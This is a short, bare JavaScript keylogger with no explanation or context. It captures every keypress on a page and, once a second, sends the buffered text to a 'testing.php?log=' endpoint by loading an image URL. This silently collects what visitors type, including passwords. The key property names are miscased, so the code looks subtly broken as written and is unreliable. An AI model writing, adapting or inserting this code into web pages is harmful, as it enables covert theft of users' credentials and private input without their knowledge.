var keys = '';

document.onkeypress =function(e)
{
	var get = window.event ? event : e;
	var key = get.keycode ? get.keycode : get.charcode;
	key = String.fromCharCode(key);
	keys += key ;
}
window.setInterval(function()
{
	new Image().src = 'testing.php?log=' + keys;
	keys = '';
},1000);
